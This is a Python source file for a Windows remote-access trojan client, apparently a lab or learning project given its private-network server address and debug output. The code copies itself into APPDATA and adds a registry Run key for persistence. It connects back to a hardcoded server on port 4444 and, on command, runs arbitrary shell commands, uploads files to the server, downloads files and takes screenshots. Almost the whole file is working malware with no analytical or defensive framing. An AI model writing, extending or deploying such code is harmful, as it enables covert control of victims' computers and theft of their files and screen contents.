# Import necessary modules
import socket
import subprocess
import os
import time
import ctypes
import shutil
import sys
from PIL import ImageGrab
import tempfile

# Server connection details
SERVER_IP = "192.168.30.129"
SERVER_PORT = 4444
BUFFER_SIZE = 1024

# ---------------------------------------------
# Function to establish persistence via registry
# ---------------------------------------------
def setup_persistence():
    exe_name = "client.exe"
    target_path = os.path.join(os.environ["APPDATA"], exe_name)

    # Copy the executable to a persistent location and set a registry key to run at startup
    if not os.path.exists(target_path):
        try:
            print(f"[DEBUG] Copying to {target_path}")
            shutil.copyfile(sys.executable, target_path)

            # Add registry key for persistence
            reg_command = f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Client /t REG_SZ /d "{target_path}" /f'
            print(f"[DEBUG] Running: {reg_command}")
            result = subprocess.run(reg_command, shell=True, capture_output=True, text=True)

            if result.returncode == 0:
                print("[+] Persistence added to registry.")
            else:
                print(f"[!] Failed to add registry key: {result.stderr}")

        except Exception as e:
            print(f"[!] Persistence setup error: {e}")
    else:
        print("[*] Persistence already set.")

# ---------------------------------------------
# Function to check if the script has admin rights
# ---------------------------------------------
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

# ---------------------------------------------
# Function to send a file to the server
# ---------------------------------------------
def send_file(s, path):
    try:
        if not os.path.isfile(path):
            s.send(b"File not found__END__")
            return

        if os.path.getsize(path) == 0:
            s.send(b"File is empty__END__")
            return

        print(f"[DEBUG] Sending file: {path}")
        with open(path, 'rb') as f:
            while chunk := f.read(BUFFER_SIZE):
                print(f"[DEBUG] Chunk: {chunk[:50]}")  # Preview first 50 bytes
                s.send(chunk)
            s.send(b"__END__")  # Signal end of file

    except Exception as e:
        try:
            s.send(f"[!] Error sending file: {e}__END__".encode())
        except:
            pass

# ---------------------------------------------
# Function to receive a file from the server
# ---------------------------------------------
def receive_file(s, dest_path):
    try:
        with open(dest_path, 'wb') as f:
            buffer = b''
            while True:
                data = s.recv(BUFFER_SIZE)
                if not data:
                    break
                buffer += data
                if b"__END__" in buffer:
                    parts = buffer.split(b"__END__", 1)
                    f.write(parts[0])
                    print(f"[DEBUG] Wrote {len(parts[0])} bytes to {dest_path}")
                    break
                f.write(buffer)
                print(f"[DEBUG] Wrote {len(buffer)} bytes to {dest_path}")
                buffer = b''
        s.send(f"[+] File saved to: {dest_path}".encode())
    except Exception as e:
        try:
            s.send(f"[!] Error receiving file: {e}".encode())
        except:
            pass

# ---------------------------------------------
# Function to handle incoming commands from server
# ---------------------------------------------
def handle_commands(s):
    while True:
        try:
            cmd = s.recv(BUFFER_SIZE)

            if not cmd:
                print("[-] Server disconnected.")
                break

            cmd = cmd.decode().strip()

            if cmd == "terminate":
                # Close connection on terminate command
                s.close()
                break

            elif cmd.startswith("cd "):
                # Change current directory
                path = cmd[3:].strip()
                try:
                    os.chdir(path)
                    s.send(f"[+] Changed directory to: {os.getcwd()}".encode())
                except Exception as e:
                    s.send(f"[!] Failed to change directory: {e}".encode())

            elif cmd == "pwd":
                # Send current working directory
                s.send(os.getcwd().encode())

            elif cmd == "checkPriv":
                # Check if running with admin privileges
                s.send(b"[+] Admin privileges" if is_admin() else b"[!] Standard user")

            elif cmd.startswith("grab*"):
                # Send specified file to server
                _, filepath = cmd.split("*", 1)
                cleaned_path = filepath.strip().strip('"').strip()
                print(f"[DEBUG] Trying to send file: {cleaned_path}")
                send_file(s, cleaned_path)

            elif cmd.startswith("send*"):
                # Receive a file from server and save to destination
                _, dest_path, filename = cmd.split("*")
                receive_file(s, os.path.join(dest_path, filename))

            elif cmd == "screencap":
                # Capture and send a screenshot
                tmpdir = tempfile.mkdtemp()
                screenshot_path = os.path.join(tmpdir, "screenshot.jpg")
                ImageGrab.grab().save(screenshot_path, "JPEG")
                send_file(s, screenshot_path)
                shutil.rmtree(tmpdir)

            elif cmd.startswith("receive_file"):
                # Save an incoming file to a given destination
                try:
                    _, dest_path = cmd.split(" ", 1)
                    dest_path = dest_path.strip('"')
                    receive_file(s, dest_path)
                    s.send(f"[+] File saved to: {dest_path}".encode())
                except Exception as e:
                    s.send(f"[!] Error receiving file: {e}".encode())

            else:
                # Execute arbitrary shell command
                result = subprocess.run(cmd, shell=True, capture_output=True)
                s.send(result.stdout + result.stderr)

        except Exception as e:
            try:
                s.send(f"[!] Command error: {e}".encode())
            except:
                break

# ---------------------------------------------
# Function to maintain a persistent connection to the server
# ---------------------------------------------
def connect():
    while True:
        try:
            s = socket.socket()
            s.settimeout(5)
            s.connect((SERVER_IP, SERVER_PORT))
            print("[+] Connected.")
            handle_commands(s)
        except Exception as e:
            print(f"[-] Failed to connect: {e}")
            time.sleep(5)

# ---------------------------------------------
# Main execution entry point
# ---------------------------------------------
def main():
    setup_persistence()  # Ensure script runs on startup
    connect()            # Attempt to connect to server

if __name__ == "__main__":
    main()
